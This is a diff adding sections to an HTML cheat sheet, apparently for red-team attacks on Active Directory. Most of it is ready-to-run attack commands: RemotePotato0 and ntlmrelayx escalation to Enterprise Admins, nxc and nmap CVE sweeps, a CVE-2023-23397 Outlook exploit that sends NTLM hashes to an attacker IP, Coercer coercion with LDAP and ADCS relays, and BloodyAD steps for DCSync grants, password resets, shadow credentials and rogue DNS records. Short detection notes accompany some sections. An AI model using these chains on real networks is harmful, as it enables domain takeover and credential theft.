+            <td><code class="ic">.\winPEASx64.exe</code> — look for <em>[!] CVE</em> markers in output</td>
+          </tr>
+        </table>
+        <div style="background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:10px 14px;font-size:12px;margin:10px 0 14px;color:var(--text2)">
+          <strong style="color:var(--text)">Workflow:</strong> Run WES-NG offline first (no risk, no detection). If a candidate CVE looks promising, confirm with Watson/Sherlock on the target. Always verify the patch KB with <code class="ic">wmic qfe list | findstr &lt;KB&gt;</code> before downloading a PoC — false positives from WES-NG happen when a superseding rollup installs the fix under a different KB number.
+        </div>
+
+        <div class="ref-sub">RemotePotato0 — Domain Escalation via NTLM Relay from Session 0</div>
+        <table class="ref-tbl">
+          <tr><th>Step</th><th>What you need</th><th>What you get</th></tr>
+          <tr><td>Prerequisites</td><td>Local Admin on target (Session 0 access) + a Domain Admin actively logged into an interactive session (Session 1) on the same machine</td><td>—</td></tr>
+          <tr><td>Verify DA session</td><td>Shell in Session 0</td><td>Confirm DA is logged in: <code class="ic">query sessions</code> — look for <code class="ic">console</code> or <code class="ic">rdp-tcp#N</code> session owned by a DA account</td></tr>
+          <tr><td>Setup relay (attacker)</td><td>ntlmrelayx.py on attacker</td><td>Relays DA's NTLM auth → adds your user to Enterprise Admins + grants DCSync rights<br><code class="ic">ntlmrelayx.py -t ldap://&lt;DC-IP&gt; --escalate-user &lt;your-user&gt;</code></td></tr>
+          <tr><td>Trigger (Win10 1809+ — needs port fwd)</td><td>socat on separate machine forwarding attacker:135 → target:9999</td><td>Redirect the OXID resolution to your fake resolver<br><code class="ic">socat tcp-listen:135,reuseaddr,fork tcp:&lt;target&gt;:9999</code><br>Then: <code class="ic">.\RemotePotato0.exe -m 0 -r &lt;attacker-IP&gt; -x &lt;socat-machine&gt; -p 9999</code></td></tr>
+          <tr><td>Trigger (pre–Win10 1809)</td><td>Direct access</td><td><code class="ic">.\RemotePotato0.exe -m 0 -r &lt;attacker-IP&gt; -p 9999</code></td></tr>
+          <tr><td>Outcome</td><td>—</td><td>Your user is now in Enterprise Admins with DCSync rights — no CVE, no patch available (Microsoft won't fix). Dump all hashes: <code class="ic">secretsdump.py &lt;domain&gt;/&lt;your-user&gt;:&lt;pass&gt;@&lt;DC-IP&gt;</code></td></tr>
+        </table>
+        <div class="detect">&#128065; Detection: Potato attacks — EventID 4624 (logon type 3/network, SYSTEM impersonation), unusual named pipe connections (Event 17/18 in Sysmon). SMBGhost — monitor for malformed SMBv3 negotiate packets. HiveNightmare — EventID 4656/4663 on SAM/SYSTEM hive VSS paths by non-admin users. RemotePotato0 — OXID resolution requests to non-standard IPs (DCOM traffic from workstations), LDAP writes adding users to Enterprise Admins group (EventID 4756), DCSync rights grant (EventID 5136 on domain root nTSecurityDescriptor).</div>
+
+      </div>
+    </div>
+
+    <!-- AD Vulnerability & Patch Scanning -->
+    <div class="ref-card" id="rc-vuln-scan">
+      <div class="ref-hdr" onclick="toggleRef('rc-vuln-scan')">
+        <span class="ref-icon">&#128269;</span>
+        <span class="ref-title">AD CVE &amp; Outdated Software Identification — Scanning &amp; Enumeration</span>
+        <span class="ref-chev">&#9660;</span>
+      </div>
+      <div class="ref-body">
+        <p style="font-size:12px;color:var(--text2);margin:8px 0 12px">Finding vulnerable hosts before exploiting them. LDAP gives you OS versions and patch-level indicators across the entire domain from a single low-privilege query. nxc modules confirm individual CVEs in one line. PingCastle and ADRecon give you the full picture including structural misconfigurations.</p>
+
+        <div class="ref-sub">nxc CVE &amp; Configuration Modules</div>
+        <table class="ref-tbl">
+          <tr><th>Module</th><th>What you need</th><th>What it checks</th><th>Key output</th></tr>
+          <tr><td><code class="ic">-M zerologon</code></td><td>Network access to DC port 445 — <strong>no creds needed</strong></td><td>CVE-2020-1472 — DC accepts all-zero Netlogon credentials</td><td><code class="ic">VULNERABLE</code> = unauthenticated DC takeover path open</td></tr>
+          <tr><td><code class="ic">-M ms17-010</code></td><td>Port 445, no creds</td><td>CVE-2017-0144 EternalBlue — SMBv1 buffer overflow</td><td><code class="ic">VULNERABLE</code> = unauthenticated SYSTEM on Win7/2008R2</td></tr>
+          <tr><td><code class="ic">-M smbghost</code></td><td>Port 445, no creds</td><td>CVE-2020-0796 — SMBv3.1.1 compression overflow (Win10 1903/1909 only)</td><td><code class="ic">VULNERABLE</code> = LPE or pre-auth RCE</td></tr>
+          <tr><td><code class="ic">-M nopac</code></td><td>Valid domain user</td><td>CVE-2021-42278 + 42287 — sAMAccountName spoofing + PAC confusion</td><td><code class="ic">VULNERABLE</code> = any domain user → DA path open (MAQ + unpatched)</td></tr>
+          <tr><td><code class="ic">-M petitpotam</code></td><td>No creds (pre-patch) / valid user (post-patch)</td><td>CVE-2021-36942 — EFSR coercion; foundational for NTLM relay chains</td><td><code class="ic">VULNERABLE</code> = coercion to your listener viable</td></tr>
+          <tr><td><code class="ic">-M spooler</code></td><td>Valid domain user</td><td>Print Spooler running on target (pre-req for PrinterBug / PrintNightmare)</td><td><code class="ic">Spooler service enabled</code> = MS-RPRN coercion viable</td></tr>
+          <tr><td><code class="ic">-M printnightmare</code></td><td>Valid domain user</td><td>CVE-2021-1675 / CVE-2021-34527 — Spooler + AddPrinterDriverEx vulnerable</td><td><code class="ic">VULNERABLE</code> = arbitrary DLL load as SYSTEM</td></tr>
+          <tr><td><code class="ic">-M webdav</code></td><td>Valid domain user</td><td>WebClient service running — enables HTTP-based coercion (bypasses SMB signing)</td><td><code class="ic">WebClient service enabled</code> = Coercer --webdav viable</td></tr>
+          <tr><td><code class="ic">-M wcc</code></td><td>Valid domain user (more detail with LA)</td><td>Config audit: SMB signing, LDAP signing, NTLMv1, WDigest, LAPS, UAC, Defender, PS version</td><td>Per-check <code class="ic">PASS/FAIL</code> — each failure is an attack surface</td></tr>
+          <tr><td><code class="ic">-M gpp_password</code></td><td>Valid domain user (reads SYSVOL)</td><td>MS14-025 — Groups.xml / Registry.xml cPassword in GPO SYSVOL share</td><td>Cleartext credentials from GPP</td></tr>
+          <tr><td><code class="ic">-M laps</code></td><td>Valid user with LAPS read ACE, or DA</td><td>Reads ms-Mcs-AdmPwd / msLAPS-Password from computer objects</td><td>Cleartext local admin password per machine</td></tr>
+          <tr><td><code class="ic">-M coerce_plus</code></td><td>Valid domain user</td><td>Combined sweep: MS-RPRN, MS-EFSR, MS-FSRVP, MS-DFSNM coercion vectors</td><td>Which coercion methods are open on a target</td></tr>
+          <tr><td><code class="ic">-M enum_av</code></td><td>Valid domain user</td><td>WMI-based AV/EDR detection</td><td>Product name + state (running/disabled)</td></tr>
+        </table>
+        <p style="font-size:11px;color:var(--text2);margin:6px 0 2px">Run format: <code class="ic">nxc smb &lt;SUBNET&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' -M &lt;module&gt;</code> — most modules accept a subnet and report per-host.</p>
+
+        <div class="ref-sub">nmap SMB Vulnerability Scripts</div>
+        <table class="ref-tbl">
+          <tr><th>Script</th><th>CVE / Purpose</th><th>Targets</th></tr>
+          <tr><td><code class="ic">smb-vuln-ms17-010</code></td><td>CVE-2017-0144 — EternalBlue</td><td>Win 7, Server 2008 R2</td></tr>
+          <tr><td><code class="ic">smb-vuln-ms08-067</code></td><td>CVE-2008-4250 — NetAPI</td><td>XP, 2003, Vista, 2008</td></tr>
+          <tr><td><code class="ic">smb-vuln-ms10-054</code></td><td>CVE-2010-2550 — SMBv2 pool overflow</td><td>XP, 2003, Vista, 2008</td></tr>
+          <tr><td><code class="ic">smb-vuln-ms10-061</code></td><td>CVE-2010-2729 — Print Spooler impersonation</td><td>XP, 2003</td></tr>
+          <tr><td><code class="ic">smb-security-mode</code></td><td>SMBv1 state + signing enforcement</td><td>All Windows</td></tr>
+          <tr><td><code class="ic">smb2-security-mode</code></td><td>SMBv2 signing required/not — key for relay targeting</td><td>All modern Windows</td></tr>
+          <tr><td><code class="ic">smb-os-discovery</code></td><td>OS, hostname, domain name, domain SID, time</td><td>All Windows</td></tr>
+        </table>
+        <p style="font-size:11px;color:var(--text2);margin:4px 0 2px">Run all at once: <code class="ic">nmap --script "smb-vuln-*,smb-security-mode,smb2-security-mode,smb-os-discovery" -p 445 &lt;SUBNET&gt;/24 -T4</code></p>
+
+        <div class="ref-sub">OS Version &amp; LAPS Coverage — LDAP Enumeration</div>
+        <table class="ref-tbl">
+          <tr><th>Task</th><th>What you need</th><th>What you get</th><th>Command</th></tr>
+          <tr><td>OS version summary (all hosts)</td><td>Valid domain user</td><td>Count of each OS version across the domain — reveals old/unpatched servers instantly</td><td>PowerView: <code class="ic">Get-DomainComputer -Properties Name,OperatingSystem | Group-Object OperatingSystem | Sort Count -Desc</code><br>nxc: <code class="ic">nxc smb &lt;SUBNET&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;'</code> — OS shown in banner per host</td></tr>
+          <tr><td>Unsupported OS (high-value exploit targets)</td><td>Valid domain user</td><td>Hosts running XP / Vista / Win7 / Server 2003/2008/2012 — likely missing critical patches</td><td><code class="ic">Get-DomainComputer -Properties Name,OperatingSystem | Where-Object {$_.OperatingSystem -match "2003|2008|2012|XP|Vista|Windows 7|Windows 8 "} | Sort OperatingSystem | ft -Auto</code></td></tr>
+          <tr><td>Missing LAPS</td><td>Valid domain user (ms-Mcs-AdmPwdExpirationTime readable)</td><td>Computers without LAPS installed — shared local admin password likely → PTH spray</td><td><code class="ic">Get-DomainComputer -Properties Name,OperatingSystem,"ms-Mcs-AdmPwdExpirationTime" | Where-Object {$_."ms-Mcs-AdmPwdExpirationTime" -eq $null}</code><br>ldapsearch: <code class="ic">(&amp;(objectClass=computer)(!(ms-Mcs-AdmPwdExpirationTime=*)))</code></td></tr>
+          <tr><td>LDAP OS query (Linux / no PowerShell)</td><td>Valid domain user</td><td>Full OS list per computer</td><td><code class="ic">ldapsearch -H ldap://&lt;DC-IP&gt; -D '&lt;domain&gt;\&lt;user&gt;' -w '&lt;pass&gt;' -b 'DC=corp,DC=local' '(objectClass=computer)' sAMAccountName operatingSystem operatingSystemVersion | grep -E "^dn:|operatingSystem:"</code></td></tr>
+          <tr><td>Stale computers (inactive &gt;90 days)</td><td>Valid domain user</td><td>Machines not seen in 90 days — often unpatched, unmonitored, easier targets</td><td><code class="ic">$c=(Get-Date).AddDays(-90); Get-DomainComputer -Properties Name,LastLogonDate | Where-Object {$_.LastLogonDate -lt $c -or $_.LastLogonDate -eq $null}</code></td></tr>
+        </table>
+
+        <div class="ref-sub">Software Version Discovery (from Low-Priv Domain User)</div>
+        <table class="ref-tbl">
+          <tr><th>Software</th><th>Method</th><th>Command</th><th>Version Mapping</th></tr>
+          <tr><td><strong>Exchange</strong></td><td>HTTP OWA banner (unauthenticated)</td><td><code class="ic">curl -sk https://mail.&lt;domain&gt;/owa/ -I | grep -i "x-owa-version\|server:"</code></td><td>15.2.x = 2019, 15.1.x = 2016, 15.0.x = 2013, 14.x = 2010</td></tr>
+          <tr><td><strong>Exchange</strong></td><td>LDAP config partition</td><td><code class="ic">ldapsearch ... -b "CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=corp,DC=local" "(objectClass=msExchExchangeServer)" serialNumber name</code></td><td>serialNumber = build number → map to release</td></tr>
+          <tr><td><strong>ADCS / CA</strong></td><td>LDAP enrollment services</td><td><code class="ic">ldapsearch ... -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(objectClass=pKIEnrollmentService)" cn dNSHostName</code><br>Or: <code class="ic">certipy find -u &lt;user&gt;@&lt;domain&gt; -p &lt;pass&gt; -dc-ip &lt;DC-IP&gt;</code></td><td>CA hostname → probe <code class="ic">http://&lt;CA&gt;/certsrv/</code> for web enrollment (ESC8)</td></tr>
+          <tr><td><strong>WSUS</strong></td><td>SYSVOL GPO Registry.pol</td><td><code class="ic">findstr /s /i "WUServer" "\\&lt;DC&gt;\SYSVOL\&lt;domain&gt;\Policies\*"</code><br>Then probe: <code class="ic">curl -sk http://&lt;wsus&gt;:8530/</code></td><td>Presence on port 8530/8531 — check for SharpWSUS / PyWSUS attack surface</td></tr>
+          <tr><td><strong>MSSQL</strong></td><td>SPN enumeration (LDAP)</td><td><code class="ic">Get-DomainComputer -Properties Name,ServicePrincipalName | Where {$_.ServicePrincipalName -match "MSSQLSvc"}</code><br>Or: <code class="ic">ldapsearch ... "(servicePrincipalName=MSSQLSvc/*)" sAMAccountName servicePrincipalName</code></td><td>16.x=2022, 15.x=2019, 14.x=2017, 13.x=2016, 12.x=2014, 11.x=2012</td></tr>
+          <tr><td><strong>IIS</strong></td><td>HTTP banner + SPN</td><td><code class="ic">curl -sk http://&lt;target&gt;/ -I | grep -i server</code><br>SPN: <code class="ic">Get-DomainComputer -Properties Name,ServicePrincipalName | Where {$_.ServicePrincipalName -match "HTTP/"}</code></td><td>IIS/7.5=2008R2, IIS/8.5=2012R2, IIS/10.0=2016+</td></tr>
+        </table>
+
+        <div class="ref-sub">AD Health Check Tools</div>
+        <table class="ref-tbl">
+          <tr><th>Tool</th><th>What you need</th><th>What you get</th><th>Command</th></tr>
+          <tr>
+            <td><strong>PingCastle</strong></td>
+            <td>Domain user (or DA for full output); run from domain-joined machine or with explicit creds</td>
+            <td>Scored HTML report (0–100) across: stale accounts, trust misconfigs, dangerous ACEs, obsolete OS, SMB/LDAP signing, LAPS coverage, delegation, GPO passwords, DC patch state, schema version, MAQ</td>
+            <td>
+              <code class="ic">PingCastle.exe --healthcheck --server &lt;domain&gt;</code> — full report<br>
+              <code class="ic">PingCastle.exe --healthcheck --server &lt;domain&gt; --explore-trust</code> — include all trusts<br>
+              <code class="ic">PingCastle.exe --scanner vuln --server &lt;domain&gt;</code> — targeted CVE check (ZeroLogon, PetitPotam, NoPac, SMBGhost)<br>
+              <code class="ic">PingCastle.exe --scanner spooler --server &lt;IP-range&gt;</code> — Spooler scan<br>
+              <code class="ic">PingCastle.exe --scanner smb --server &lt;IP-range&gt;</code> — SMB signing + version
+            </td>
+          </tr>
+          <tr>
+            <td><strong>ADRecon</strong></td>
+            <td>Domain user minimum; DA for ACL/BitLocker output; run from domain-joined machine</td>
+            <td>Full AD snapshot as Excel/CSV/HTML: all users (with delegation flags, SPN, DONT_REQ_PREAUTH, passwordNeverExpires), computers (OS, LAPS state, last logon, delegation), groups, GPOs, ACLs (dangerous permissions), trusts, DNS, WSUS, LAPS readers</td>
+            <td>
+              <code class="ic">Import-Module .\ADRecon.ps1</code><br>
+              <code class="ic">Invoke-ADRecon -Method ADWS -DomainController &lt;DC-FQDN&gt; -OutputType EXCEL,CSV,HTML</code><br>
+              <code class="ic">Invoke-ADRecon -Method LDAP -DomainController &lt;DC-IP&gt; -Credential (Get-Credential)</code> — from non-domain machine<br>
+              Selective: <code class="ic">Invoke-ADRecon -Collect Users,Computers,GPO,ACLs,Trusts</code>
+            </td>
+          </tr>
+        </table>
+
+        <div class="ref-sub">BloodHound CE — Key Structural Vulnerability Queries</div>
+        <table class="ref-tbl">
+          <tr><th>Query purpose</th><th>Cypher</th></tr>
+          <tr><td>Unsupported OS (old servers)</td><td><code class="ic">MATCH (c:Computer) WHERE c.operatingsystem CONTAINS "2008" OR c.operatingsystem CONTAINS "2003" OR c.operatingsystem CONTAINS "XP" OR c.operatingsystem CONTAINS "Windows 7" OR c.operatingsystem CONTAINS "2012" RETURN c.name, c.operatingsystem</code></td></tr>
+          <tr><td>Missing LAPS</td><td><code class="ic">MATCH (c:Computer {enabled:true}) WHERE c.haslaps = false OR c.haslaps IS NULL RETURN c.name, c.operatingsystem ORDER BY c.name</code></td></tr>
+          <tr><td>Unconstrained delegation (non-DC)</td><td><code class="ic">MATCH (c:Computer {unconstraineddelegation:true, enabled:true}) WHERE NOT (c)-[:DCFor]->(:Domain) RETURN c.name, c.operatingsystem</code></td></tr>
+          <tr><td>AS-REP roastable users</td><td><code class="ic">MATCH (u:User {dontreqpreauth:true, enabled:true}) RETURN u.name, u.description</code></td></tr>
+          <tr><td>Kerberoastable + AdminCount (tier-0)</td><td><code class="ic">MATCH (u:User {hasspn:true, enabled:true, admincount:true}) RETURN u.name, u.serviceprincipalnames</code></td></tr>
+          <tr><td>DCSync rights (non-DCs)</td><td><code class="ic">MATCH p=(n)-[:GetChangesAll|GetChanges*1..]->(d:Domain) WHERE NOT n.name STARTS WITH "DOMAIN CONTROLLERS" RETURN n.name, type(n)</code></td></tr>
+          <tr><td>MAQ value (noPac / RBCD feasibility)</td><td><code class="ic">MATCH (d:Domain) RETURN d.name, d.machineaccountquota</code> — value &gt; 0 = noPac viable</td></tr>
+          <tr><td>WriteDACL / WriteOwner on domain</td><td><code class="ic">MATCH p=(n)-[:WriteDacl|WriteOwner]->(d:Domain) RETURN n.name, type(n), d.name</code></td></tr>
+          <tr><td>Constrained delegation (users)</td><td><code class="ic">MATCH (u:User {enabled:true}) WHERE u.allowedtodelegate IS NOT NULL AND u.allowedtodelegate &lt;&gt; [] RETURN u.name, u.allowedtodelegate</code></td></tr>
+          <tr><td>Password never expires (non-krbtgt)</td><td><code class="ic">MATCH (u:User {passwordneverexpires:true, enabled:true}) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN u.name, u.description</code></td></tr>
+          <tr><td>Shortest path: Domain Users → DA</td><td><code class="ic">MATCH p=shortestPath((g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[*1..]->(t:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p</code></td></tr>
+        </table>
+        <div class="detect">&#128065; Detection: nxc module scans generate Event 4624 (logon) per host probed — a burst of type 3 logons from the same source across many hosts in seconds is detectable. PingCastle / ADRecon make large volumes of LDAP queries (Event 1644 on DCs with query stats enabled). nmap smb-vuln scripts send malformed SMB packets — Sysmon network events + IDS signatures on malformed SMB will flag them. WCC and coerce_plus scans trigger named-pipe access events.</div>
       </div>
     </div>
 
@@ -1908,6 +2424,34 @@ mark.hl{background:#4d1a1a;color:#ffb3b3;border-radius:2px;padding:0 2px}
         </table>
         <div class="detect">&#128065; Detection: Event 2889 (unsigned LDAP bind) even when policy = Required — this is the anomaly. LDAP relay attempts from sources that should be blocked by signing policy. Monitor DC LDAP logs for connections lacking proper GSSAPI signatures.</div>
 
+        <div class="ref-sub" style="margin-top:14px">CVE-2023-23397 — Outlook NTLM Hash Theft (Zero-Click)</div>
+        <table class="ref-tbl">
+          <tr><th>Field</th><th>Detail</th></tr>
+          <tr><td>What</td><td>Calendar invite/task/email with <code class="ic">PidLidReminderFileParameter</code> MAPI property set to a UNC path — Outlook fetches it automatically when the reminder fires, leaking victim's NetNTLMv2 hash to attacker's SMB listener. Victim never needs to click anything.</td></tr>
+          <tr><td>Requires</td><td>Ability to send a meeting invite to victim (internal mail or compromised account); victim running Outlook for Windows; attacker SMB listener reachable on port 445. <strong>Not affected:</strong> Outlook on Mac/iOS/Android/OWA.</td></tr>
+          <tr><td>Gets</td><td>Victim NetNTLMv2 hash → crack offline or relay to target with SMB signing disabled</td></tr>
+          <tr><td>Listen (capture)</td><td><code class="ic">sudo responder -I eth0 -v</code> — NetNTLMv2 hash printed when reminder fires</td></tr>
+          <tr><td>Listen (relay)</td><td><code class="ic">ntlmrelayx.py -tf targets.txt -smb2support</code> — relay immediately to hosts without SMB signing</td></tr>
+          <tr><td>Send exploit</td><td><code class="ic">python3 CVE-2023-23397.py --server mail.corp --username attacker@corp --password 'Pass' --recipient victim@corp --attacker-ip &lt;ATTACKER-IP&gt;</code></td></tr>
+          <tr><td>Affected</td><td>Outlook 2013–2021 + Microsoft 365 Apps on Windows. Patch: March 2023 (KB5002333). <strong>Check first:</strong> <code class="ic">nxc smb &lt;SUBNET&gt;/24 --gen-relay-list no-signing.txt</code> to find relay targets.</td></tr>
+        </table>
+        <div class="detect">&#128065; Detection: Outlook.exe initiating outbound SMB (port 445) to external/unusual IPs — this should never happen. Sysmon Event 3: Outlook.exe → port 445. Event 4624 (type 3 NTLM logon) on attacker listener. Block outbound 445 at perimeter — single most effective mitigation.</div>
+
+        <div class="ref-sub" style="margin-top:14px">Coercer — Multi-Protocol NTLM Authentication Coercion</div>
+        <table class="ref-tbl">
+          <tr><th>Field</th><th>Detail</th></tr>
+          <tr><td>What</td><td>Single tool wrapping 20+ RPC coercion methods across multiple Windows protocols. Forces a target machine to authenticate to an attacker-controlled host — captures machine account hash or relays it to LDAP/ADCS for RBCD/certificate abuse.</td></tr>
+          <tr><td>Requires</td><td>Valid low-privilege domain creds (IPC$ access); attacker listener (Responder for capture, ntlmrelayx for relay). Install: <code class="ic">pip3 install coercer</code></td></tr>
+          <tr><td>Gets</td><td>Machine account NetNTLMv2 hash of target (e.g., DC$) → relay to LDAP for RBCD or ADCS for DC cert (ESC8 path) → DCSync</td></tr>
+          <tr><td>Protocols covered</td><td>MS-RPRN (PrinterBug), MS-EFSR (PetitPotam), MS-DFSNM (DFSCoerce), MS-FSRVP (ShadowCoerce), MS-EVEN6, MS-ICPR, MS-TSCH, WebDAV coercion + more</td></tr>
+          <tr><td>Scan (no trigger)</td><td><code class="ic">coercer scan -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; --target &lt;DC-IP&gt; --listener-ip &lt;ATTACKER-IP&gt;</code></td></tr>
+          <tr><td>Coerce (trigger all)</td><td><code class="ic">coercer coerce -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; --target &lt;DC-IP&gt; --listener-ip &lt;ATTACKER-IP&gt;</code></td></tr>
+          <tr><td>Relay to LDAP (RBCD)</td><td><code class="ic">ntlmrelayx.py -t ldap://&lt;DC-IP&gt; --delegate-access --escalate-user &lt;attacker-computer$&gt; -smb2support</code></td></tr>
+          <tr><td>Relay to ADCS (ESC8)</td><td><code class="ic">ntlmrelayx.py -t http://&lt;CA-IP&gt;/certsrv/certfnsh.asp --adcs --template DomainController -smb2support</code></td></tr>
+          <tr><td>WebDAV coercion note</td><td>When WebClient service runs on target, coercion goes over HTTP (port 80) instead of SMB — bypasses SMB signing requirement, enabling relay even on signing-enforced networks. Trigger with <code class="ic">--webdav</code> flag.</td></tr>
+        </table>
+        <div class="detect">&#128065; Detection: DC initiating outbound SMB (port 445) to non-DC IPs — high-fidelity alert. Named pipe access to <code>\pipe\spoolss</code>, <code>\pipe\efsrpc</code>, <code>\pipe\lsarpc</code> from unexpected sources. Event 4624 (type 3 logon) for machine accounts on unexpected hosts. Mitigation: disable Print Spooler on DCs; enable LDAP signing + channel binding + EPA on ADCS; block DC outbound SMB at firewall.</div>
+
       </div>
     </div>
 
@@ -2513,6 +3057,71 @@ mark.hl{background:#4d1a1a;color:#ffb3b3;border-radius:2px;padding:0 2px}
       </div>
     </div>
 
+    <!-- BloodyAD -->
+    <div class="ref-card" id="rc-bloodya">
+      <div class="ref-hdr" onclick="toggleRef('rc-bloodya')">
+        <span class="ref-icon">&#127981;</span>
+        <span class="ref-title">BloodyAD — Pure-LDAP AD Privilege Escalation &amp; Object Manipulation</span>
+        <span class="ref-chev">&#9660;</span>
+      </div>
+      <div class="ref-body">
+        <p style="font-size:12px;color:var(--text2);margin:8px 0 12px">BloodyAD is a pure LDAP/LDAPS tool for Active Directory privilege escalation — no SMB, no RPC. It supports every auth method (password, NT hash, Kerberos ccache, certificate/PKINIT). Global syntax: <code class="ic">bloodyAD --host &lt;DC-IP&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; &lt;verb&gt; &lt;noun&gt;</code></p>
+        <div class="ref-sub">Installation</div>
+        <table class="ref-tbl">
+          <tr><th>Method</th><th>Command</th></tr>
+          <tr><td>pipx (recommended)</td><td><code class="ic">pipx install bloodyAD</code></td></tr>
+          <tr><td>uv</td><td><code class="ic">uv tool install bloodyAD</code></td></tr>
+          <tr><td>pip</td><td><code class="ic">pip install bloodyAD</code></td></tr>
+        </table>
+        <div class="ref-sub">Authentication Modes</div>
+        <table class="ref-tbl">
+          <tr><th>Auth Type</th><th>Flag(s)</th><th>Notes</th></tr>
+          <tr><td>Password</td><td><code class="ic">-u &lt;user&gt; -p &lt;pass&gt;</code></td><td>Cleartext — standard LDAP bind</td></tr>
+          <tr><td>Pass-the-Hash</td><td><code class="ic">-u &lt;user&gt; -p :&lt;NThash&gt;</code></td><td>NT hash as password with leading colon</td></tr>
+          <tr><td>Kerberos (ccache)</td><td><code class="ic">-u &lt;user&gt; -k</code></td><td>Uses <code class="ic">KRB5CCNAME</code> env var; pair with <code class="ic">-s</code> for LDAPS</td></tr>
+          <tr><td>Certificate (PKINIT)</td><td><code class="ic">-u &lt;user&gt; -c &lt;key.pem&gt;:&lt;cert.pem&gt;</code></td><td>Schannel / PKINIT — pair with <code class="ic">-s</code> for LDAPS</td></tr>
+          <tr><td>LDAPS</td><td><code class="ic">-s</code> (add to any command)</td><td>Port 636; required for some write operations</td></tr>
+        </table>
+        <div class="ref-sub">Enumeration &amp; Recon</div>
+        <table class="ref-tbl">
+          <tr><th>Command</th><th>What you need</th><th>What you get</th></tr>
+          <tr><td><code class="ic">get writable --detail</code></td><td>Any valid creds</td><td>Every AD object/attribute the current user can write — instant privilege map</td></tr>
+          <tr><td><code class="ic">get object &lt;target&gt; --attr &lt;attr&gt;</code></td><td>Any valid creds</td><td>Single attribute value (e.g. <code class="ic">msDS-ManagedPassword</code>, <code class="ic">ms-mcs-admpwd</code>)</td></tr>
+          <tr><td><code class="ic">get bloodhound</code></td><td>Any valid creds</td><td>BloodHound-compatible JSON dump via LDAP — no SharpHound needed</td></tr>
+          <tr><td><code class="ic">get dnsDump</code></td><td>Any valid creds</td><td>Full zone dump of all AD-integrated DNS records</td></tr>
+          <tr><td><code class="ic">msldap badsuccessor_check</code></td><td>Any valid creds</td><td>Check if domain is vulnerable to CVE-2025-29810 (BadSuccessor)</td></tr>
+        </table>
+        <div class="ref-sub">ACL / Privilege Escalation Abuse</div>
+        <table class="ref-tbl">
+          <tr><th>Attack</th><th>Command</th><th>What you need</th><th>What you get</th></tr>
+          <tr><td>Add to group</td><td><code class="ic">add groupMember &lt;group-DN&gt; &lt;member&gt;</code></td><td>WriteMember / GenericAll on target group</td><td>Membership in any group (Domain Admins, Backup Operators, etc.)</td></tr>
+          <tr><td>Grant GenericAll</td><td><code class="ic">add genericAll &lt;target-DN&gt; &lt;trustee&gt;</code></td><td>WriteDACL on target object</td><td>Full control ACE on any object for chosen trustee</td></tr>
+          <tr><td>Set password</td><td><code class="ic">set password &lt;target&gt; &lt;newpass&gt;</code></td><td>ForceChangePassword / GenericAll on user</td><td>Password reset without knowing current password</td></tr>
+          <tr><td>Grant DCSync</td><td><code class="ic">add dcsync &lt;trustee&gt;</code></td><td>WriteDACL on domain root NC head</td><td>Replication rights → use <code class="ic">secretsdump.py</code> to dump all hashes</td></tr>
+          <tr><td>Set owner</td><td><code class="ic">set owner &lt;target-DN&gt; &lt;new-owner&gt;</code></td><td>WriteOwner on target</td><td>Object ownership → grant yourself any ACE next</td></tr>
+          <tr><td>Shadow Credentials</td><td><code class="ic">add shadowCredentials &lt;target&gt;</code></td><td>WriteProperty on <code class="ic">msDS-KeyCredentialLink</code></td><td>TGT + NT hash via PKINIT in one command — no password change</td></tr>
+          <tr><td>RBCD</td><td><code class="ic">add rbcd &lt;TARGET$&gt; &lt;service$&gt;</code></td><td>Write on target's <code class="ic">msDS-AllowedToActOnBehalfOfOtherIdentity</code></td><td>S4U2Proxy TGS as any user to target machine</td></tr>
+          <tr><td>BadSuccessor (CVE-2025-29810)</td><td><code class="ic">add badSuccessor &lt;dmsa-name&gt; -t &lt;OU-DN&gt;</code></td><td>CreateChild on any OU (patched May 2025)</td><td>DMSA inheriting all admin group privileges in OU scope — effective Domain Admin</td></tr>
+        </table>
+        <div class="ref-sub">Object Attribute Manipulation</div>
+        <table class="ref-tbl">
+          <tr><th>Goal</th><th>Command</th><th>What you need</th><th>What you get</th></tr>
+          <tr><td>Disable preauth (AS-REP)</td><td><code class="ic">add uac &lt;target&gt; -f DONT_REQ_PREAUTH</code></td><td>WriteProperty (userAccountControl)</td><td>Target becomes AS-REP roastable → offline hash crack</td></tr>
+          <tr><td>Remove preauth flag</td><td><code class="ic">remove uac &lt;target&gt; -f DONT_REQ_PREAUTH</code></td><td>WriteProperty (userAccountControl)</td><td>Cleanup — removes the flag you added</td></tr>
+          <tr><td>Set SPN (Kerberoast)</td><td><code class="ic">set object &lt;target&gt; servicePrincipalName -v 'x/y'</code></td><td>WriteProperty (servicePrincipalName)</td><td>Target becomes Kerberoastable → crack TGS offline</td></tr>
+          <tr><td>UPN swap (ESC9/10)</td><td><code class="ic">set object &lt;target&gt; userPrincipalName -v 'victim@domain'</code></td><td>WriteProperty (userPrincipalName)</td><td>Cert maps to victim account — ADCS ESC9/10 attack path</td></tr>
+          <tr><td>Arbitrary attribute</td><td><code class="ic">set object &lt;target&gt; &lt;attribute&gt; -v '&lt;value&gt;'</code></td><td>WriteProperty on that attribute</td><td>Modify any writable LDAP attribute on any object</td></tr>
+        </table>
+        <div class="ref-sub">DNS Record Injection</div>
+        <table class="ref-tbl">
+          <tr><th>Command</th><th>What you need</th><th>What you get</th></tr>
+          <tr><td><code class="ic">add dnsRecord &lt;hostname&gt; &lt;attacker-IP&gt;</code></td><td>CreateChild on DNS zone (most domain users have this by default)</td><td>Persistent rogue A record — redirect clients for relay, phishing, or credential capture</td></tr>
+          <tr><td><code class="ic">get dnsDump</code></td><td>Any valid creds</td><td>Full zone listing — maps the network, reveals internal hostnames</td></tr>
+        </table>
